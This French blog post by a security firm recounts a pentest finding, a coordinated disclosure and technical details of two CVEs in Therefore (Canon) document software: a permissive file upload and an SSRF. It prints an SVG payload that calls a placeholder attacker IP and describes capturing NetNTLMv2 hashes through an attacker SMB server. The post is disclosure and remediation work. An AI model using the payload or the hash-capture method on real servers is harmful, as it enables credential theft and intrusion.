---
title: "Comment hacker (légalement) une multinationale de 20 milliards d'euros ?"
description: "Canon une multinationale de 20 milliards d'euros est impacté par 2 vulnérabilités critiques permettant dans certaines conditions, de compromettre l'infrastructure hébergeant l'application vulnérable. Trackflaw raconte sa découverte et son processus de divulgation responsable."
date: 2024-02-02T06:13:21+01:00
draft: false
images: [/images/hacker-multinationale-via-file-upload-et-ssrf/logo.png]
featuredImage: "/images/hacker-multinationale-via-file-upload-et-ssrf/logo.png"
featuredImagePreview: "/images/hacker-multinationale-via-file-upload-et-ssrf/logo.png"
tags: ["Penetration Testing", "Pentest", "CVE"]
---

# 📸 CVE-2023-2520{2|3} : Comment hacker une MULTINATIONALE avec un dépôt de fichiers et une SSRF ?

## Introduction

La sécurité informatique est maintenant au **coeur de notre quotidien**. Aux infos, sur internet, sur les réseaux, tout le monde, avec ou sans connaissance, semble **déjà avoir été victime** d’une attaque informatique plus ou moins grave.

Et cela peut toucher des petites entreprises comme les plus grosses du **CAC40**. Si vous pensiez que la sécurité des plus grosses sociétés de ce monde est inviolable, détrompez vous.

Quelques exemples sur les pires fuites de données :

- **Yahoo aout 2013** : informations personnelles estimées jusqu’à **3 milliards d’utilisateurs**.
- **Linkedin mai 2016** : mail/mdp de plus de **150 millions d’utilisateurs**.
- **Facebook avril 2021** : nom, prénom, mail, tel, employeurs de plus de **500 millions d’utilisateurs**.


Aujourd’hui, à travers cette article, retour sur un hack de **20 milliards d’euros** (au moins ! 😅).

## Contexte

### Processus de divulgation responsable

Cette article a été réalisée en accord avec l’ANSSI, [l’Agence Nationale des Systèmes d’Informations](https://cyber.gouv.fr/) à la suite d’un **processus de divulgation responsable**.

{{< admonition type=bug title="Soyez responsable" open=true >}}
Lors de la découverte d'une vulnérabilité, il est préférable de prendre directement contact avec le développeur/responsable de la solution. **Ne divulguez pas de vulnérabilités sans autorisation.** 
{{< /admonition >}}

### La cible

**Canon Inc** est une entreprise japonaise basée à Tokyo et spécialisée dans les produits optiques, incluant appareils photo, photocopieurs et imprimantes.

Elle produit tous les ans un CA aux alentours de **25 milliards de dollars**.

![Alt text](/images/hacker-multinationale-via-file-upload-et-ssrf/canon.png)

## Un test d'intrusion "banal"

### Retour en 2022

En **décembre 2022**, Trackflaw est mandaté pour effectuer un audit technique de type test d'intrusion web/applicatif pour un client grand compte (le nom est censuré pour raison de confidentialité).

L'audit applicatif, d'une durée de **5 jours**, était a effectuer en boite grise et concernait une application de gestion de document. Ce type d'audit est tout à fait classique et est effectué très régulièrement par Trackflaw.

Le logiciel a audité est un logiciels de **Therefore**, une filiale de **Canon**. L'étude de ce logiciel a permis de découvrir **2 vulnérabilités critiques**.

### Client ou pas client ?

**Therefore** est une société proposant des solutions de **gestion de l'information**. L'un des principaux logiciels de Therefore est spécialisé dans le traitement des documents. Toutes les solutions sont disponibles directement sur leur site web.

{{< admonition type=question title="Comment communiquer ?" open=true >}}
🤔 Du coup, les vulnérabilités découvertes concernent **Therefore** et non pas le client initial. Comment communiquer les faiblesses ?
{{< /admonition >}}

💡 En effet, la question est importante !

Lors du test d'intrusion, plusieurs vulnérabilités importantes sur la solution de traitement de documents de Therefore ont été décelées.

Le test d'intrusion a été réalisé sur **l'application de gestion documentaire** `Capture`. Les vulnérabilités concernent aussi bien la version web que la version client lourd.

En temps normal c'est au client de traiter le processus :

1. L'auditeur (Trackflaw) envoi le rapport au client initial.
2. Le client initial analyse et envoi le rapport au développeur (Therefore).
3. Le développeur (Therefore) corrige les vulnérabilités.

<video src="/images/hacker-multinationale-via-file-upload-et-ssrf/report.mp4" controls autoplay loop title="Communication des rapports" style="width:100%"></video>


Or, ici, la communication n'était pas... optimale. Il a fallu faire évoluer le processus.

1. Un premier rapport concernant toute les vulnérabilités de l'audit a été communiqué au client initial.
2. Un deuxième rapport anonymisé a été rédigé contenant uniquement les vulnérabilités impactant Therefore (et non le client initial !).
3. Ce rapport anonymisé devait être ensuite transmis à **Therefore**.


😅 Sauf que tous ne s'est encore pas passé comme prévu !


### CVE - Common Vulnerabilities and Exposures

Une solution informatique peut être utilisées par plusieurs acteurs, ou plutôt, utilisateurs.

Lors de la découverte d'une faiblesse, le chercheur doit **communiquer avec le développeur de la solution** quand il n'y a pas de client intermédiaire (au contraire de nous ici) afin de **corriger les problèmes sur l'ensemble de ses applications déployées**.

Pour ce faire, le chercheur va rédiger un petit rapport afin d'expliquer les problèmes découverts. C'est ce qu'on appelle un `advisory`.

Afin de faciliter la traçabilité des vulnérabilités découvertes dans des produits "publiques", l'organisation MITRE, soutenu par le département de la Sécurité intérieure des États-Unis, a créée **la base d'informations CVE**.

{{< admonition type=quote title="Common Vulnerabilities and Exposures" open=true >}}
`Common Vulnerabilities and Exposures` ou `CVE` est un dictionnaire d'informations publiques relatives aux vulnérabilités de sécurité. La base est maintenue par l'organisme `MITRE`, soutenu par le département de la Sécurité intérieure des États-Unis.
{{< /admonition >}}

<video src="/images/hacker-multinationale-via-file-upload-et-ssrf/mitre.mp4" controls autoplay loop title="Base de données MITRE" style="width:100%"></video>

En parallèle de la rédaction de l'advisory, **2 déclarations** ont été effectuées concernant les deux faiblesses découvertes. Aucune informatique technique n'est encore disponible à ce stade. Uniquement les identifiants des vulnérabilités sont disponibles.

Dans notre cas, 2 numéros :

- **CVE-2023-25202** : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25202
- **CVE-2023-25203** : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25203

Les CVE-2023-25202 et CVE-2023-25203 affectent `Therefore Case Manager 2018/2021` et `Therefore Solution Designer 2018/2021` (https://www.therefore.net/help/2021/en-us/rn_releasenotes.html). 

Toutes les versions égales ou inférieures à `18.4.0` et égales ou inférieures à `26.1.1` sont vulnérables aux deux vulnérabilités. A ce jour, je n'ai toujours pas de nouvelles de Therefore et si la nouvelle version est correctement patchée.

### Communication avec l'ANSSI

![Alt text](/images/hacker-multinationale-via-file-upload-et-ssrf/anssi.png)

**L'ANSSI** ou **l'Agence nationale de la sécurité des systèmes d'information** est un service français créé par décret en juillet 2009. Ce service à compétence nationale est rattaché au secrétariat général de la Défense et de la Sécurité nationale (SGDSN), autorité chargée d'assister le Premier ministre dans l'exercice de ses responsabilités en matière de défense et de sécurité nationale.

Cette organisation française a joué un rôle majeur dans l'ouverture du dialogue avec **Therefore**.

### Divulgation responsable

Après la prise de contact, l'ANSSI réussit à établir une liaison avec Therefore via le **CERT autrichien**. Ce processus d'échange s'étala sur presque **un an** et débloqua la situation.

Au bout de nombreux messages sans retour, l'ANSSI en accord avec le CERT autrichien, donna l'autorisation de divulguer les vulnérabilités le **12 décembre 2023**. 🥳

### Timeline final


| **Date**         | **Action**                                                                                      |
| ---------------- | ----------------------------------------------------------------------------------------------- |
| 28 novembre 2022 | Découverte des vulnérabilités lors du test d'intrusion                                          |
| 4 décembre 2022  | Communication des vulnérabilités au client initial                                              |
| 19 décembre 2022 | Rédaction d'un advisory à destination de Therefore                                              |
| 16 janvier 2023  | Divers contacts infructueux avec Therefore                                                      |
| 28 février 2023  | Troisième et dernière tentative de contact avec Therefore                                       |
| 2 mai 2023       | Prise de contact avec l'ANSSI                                                                   |
| 9 mai 2023       | Prise de contact avec Therefore via le CERT autrichien                                          |
| 7 septembre 2023 | Relance de l'ANSSI vers le CERT autrichien                                                      |
| 12 décembre 2023 | Divulgation responsable coordonée avec l'ANSSI et le CERT autrichien (sans accord de Therefore) |



## Les vulnérabilités

### CVE-2023-25202 : Mécanisme de dépôt de fichier non sécurisé

![CVE-2023-25202](/images/hacker-multinationale-via-file-upload-et-ssrf/CVE-2023-25202.png)


{{< admonition type=warning title="Contexte" open=true >}}
Le test d'intrusion a été réalisé dans un contexte client particulier sans le support de Therefore.

Les vulnérabilités de cet article peuvent n'être **applicables que dans un contexte spécifique**.
{{< /admonition >}}

#### Description

L'application Therefore est **trop permissive** quant au type de fichier pouvant être téléchargé par un utilisateur.

En effet, elle n'empêche que le téléchargement de fichiers `HTML`, `EXE` et `BAK`. Un attaquant peut télécharger des fichiers techniques tels que des fichiers `PHP`, `ASP`, `ASPX` et `JSP`.

Ces fichiers peuvent permettre, sous certaines conditions, **d'exécuter des commandes système** (non exploitables ici).

L'image ci-dessous résume les différentes extensions pouvant être utilisées sur l'application (générée avec la fonction `intruder` de Burp Suite Pro).

![Too many file extensions](/images/hacker-multinationale-via-file-upload-et-ssrf/screens/file-upload-1.png)

#### Exploitation

L'application empêche les fichiers `HTML` d'être déposés. Cette protection peut être facilement contournée en déposant des fichiers
`markdown (MD)` prenant en charge le HTML.

Il est important de noter qu'il n'est **pas possible de télécharger des fichiers exécutables** tels que les logiciels malveillants.

![Upload of Markdown fichier containing iframe](/images/hacker-multinationale-via-file-upload-et-ssrf/screens/file-upload-2.png)

Ce manque de contrôle sur le contenu déposé facilite l'exploitation de la vulnérabilité suivante.

#### Risques

Un attaquant est en mesure de déposer des fichiers non contrôlées par l'application. Cela permet à un attaquant d'exploiter plus facilement des vulnérabilités de type SSRF, de déposer des fichiers malveillants (autres que de type `exe`) ou de déclencher des attaques par déni de service.

Un attaquant pourrait également, sous certaines conditions, exécuter du code à travers les fichiers déposés (ASP, PHP, JSP fichiers,
etc).

#### Correction

Il est conseillé de limiter le type de fichiers à télécharger **au strict nécessaire**.

Un utilisateur standard n'a besoin, la plupart du temps, que de fichiers de traitement de texte (ex : office et fichiers PDF) et d'images. Il est conseillé de limiter le nombre d'extensions utilisables (se référer aux extensions gérées par le développeur du plugin Aspose).

### CVE-2023-25203 : Application vulnérable aux attaques de type SSRF (Server Side Request Forgery)

![CVE-2023-25203](/images/hacker-multinationale-via-file-upload-et-ssrf/CVE-2023-25203.png)

#### Description

La solution **Therefore** utilise le logiciel `Aspose` pour gérer la conversion des fichiers déposées au format PDF (cf. capture ci-dessous).

![Version divulgation in PDF metadata.](/images/hacker-multinationale-via-file-upload-et-ssrf/screens/ssrf-1.png)

L'utilisation de ce type de solution permet de convertir une grande quantité de fichiers différents (plus d'infos dans la documentation d'Aspose).

Ceci présente un risque si l'application ne gère pas correctement le filtrage des extensions inutilisées.

Selon le développeur du logiciel **Aspose**, des mesures de sécurité doivent être mises en place pour éviter qu'un attaquant
puisse faire exécuter au serveur des requêtes internes. Cette attaque est appelée **SSRF (Server Side Request Forgery)**.

La solution proposée par Therefore est vulnérable aux attaques SSRF de plusieurs manières.

#### Exploitation

##### Acces à une ressource distante

L'utilisation d'un fichier SVG illustre la possibilité de faire une requête `HTTP GET` par l'application vers un serveur contrôlé par l'attaquant.

![HTTP callback from remote victim application with a malicious SVG fichier.](/images/hacker-multinationale-via-file-upload-et-ssrf/screens/ssrf-2.png)

La capture d'écran ci-dessus illustre cette vulnérabilité SSRF à l'aide d'un fichier SVG (disponible ci-dessous).

```html
<svg width="500" height="500"
    xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xlink:href="http://IP-ATTAQUANT">
</svg>
```

##### Récupération d'empreinte de mot de passe

Dans un environnement Windows, il est possible de demander une ressource par un chemin particulier. Il est possible de coupler
cette fonctionnalité par le biais de cette faiblesse `SSRF` afin de **rediriger le compte local de la machine hébergeant l'application vers le serveur SMB de l'attaquant**.

Ce dernier recevra l'empreinte `NetNTLMv2` de ce compte de service.

Dans la capture d'écran ci-dessous, un serveur `SMB` a été déployé sur la machine attaquante. En interprétant le fichier SVG, le serveur attaquant collecte le condensat du compte machine `FR********4$`.

![Receiving NetNTLMv2 local machine account digest from the remote server.](/images/hacker-multinationale-via-file-upload-et-ssrf/screens/ssrf-3.png)

Ce condensat pourrait ensuite être relayé et/ou cassé afin **d'attaquer l'environnement Active Directory** du client initial.

##### Cartographie réseau interne

Cette vulnérabilité SSRF permet également à un attaquant de cartographier l'architecture interne du client (si celle ci communique avec Internet).

Sur la capture d'écran ci-dessous, il est possible d'atteindre le serveur `google.fr`. L'attaquant pourrait également utiliser la machine victime comme proxy pour **usurper son adresse IP publique**.

![Ifram google.fr](/images/hacker-multinationale-via-file-upload-et-ssrf/screens/ssrf-4.png)

Enfin, un attaquant est également en mesure d'effectuer les actions suivantes (non concluantes par manque de temps) :

- **Scan de ports** : il est possible de scanner les ports des machines sur le réseau.
- **Lecture de fichiers** : le plugin Aspose semble être protégé contre la lecture de fichiers (ex : capture ci-dessous.
Le service redirige vers le chargement du fichier `C:\Windows\win.ini` mais rien n'est affiché).
- **Déni de service** : un attaquant est en mesure de télécharger un document faisant référence à des images très volumineuses. Lors du traitement de cette image, la bibliothèque consomme de la mémoire et du temps pour traiter ces images.

![No file disclosure with server redirection](/images/hacker-multinationale-via-file-upload-et-ssrf/screens/ssrf-5.png)


#### Risques

Les principaux risques de cette vulnérabilité pour les clients utilisant cette solution sont les suivants :

- **Vol d'informations d'identification** : un attaquant est en mesure de collecter le condensat `NetNTLMv2` d'une personne chargeant un contenu distant. Ce type de challenge peut être cassé par l'attaquant afin de récupérer le mot de passe de l'utilisateur cible.
- **Divulgation d'images sensibles** : le traitement d'un document contenant une référence à un fichier d'image local entraînera la divulgation de ce fichier dans le document ﬁnal. Cela peut entraîner une divulgation d'informations sensibles.
- **Cartographier le système d'information de la victime** : un attaquant peut cartographier l'infrastructure de la victime et effectuer une découverte de services.
- **Déni de service** : un attaquant peut empêcher la machine de fonctionner correctement en la rendant inutilisable.

#### Correction

Pour corriger cette vulnérabilité SSRF, il est possible de modifier la conﬁguration du plugin `Aspose` utilisé dans la fonction d'analyse de fichier. Le plugin est en mesure d'empêcher les attaques SSRF.

**Aspose** a déjà publié un article mettant en garde contre les différents risques liés au chargement d'éléments distants.

L'exemple de code suivant montre comment désactiver le chargement des images externes :

```c#
public class DisableExternalImagesHandler : IResourceLoadingCallback
{
    public ResourceLoadingAction ResourceLoading(ResourceLoadingArgs args)
    {
        // Skip external images loading.
        return (args.ResourceType == ResourceType.Image)
        ? ResourceLoadingAction.Skip
        : ResourceLoadingAction.Default;
    }
}
...
const string documentFilename = "input.docx";
var disableExternalImagesOptions = new LoadOptions
{
    ResourceLoadingCallback = new DisableExternalImagesHandler()
};
var doc = new Document(documentFilename, disableExternalImagesOptions);
```

## Allez plus loin

Ouf ! Beaucoup d'informations ! 😅

👇 Une vidéo est disponible sur la chaine de Trackflaw pour une meilleur vulgarisation. N'hésitez pas à noter vos retours en commentaire 🙏

{{< youtube TnIGum11HnY >}}
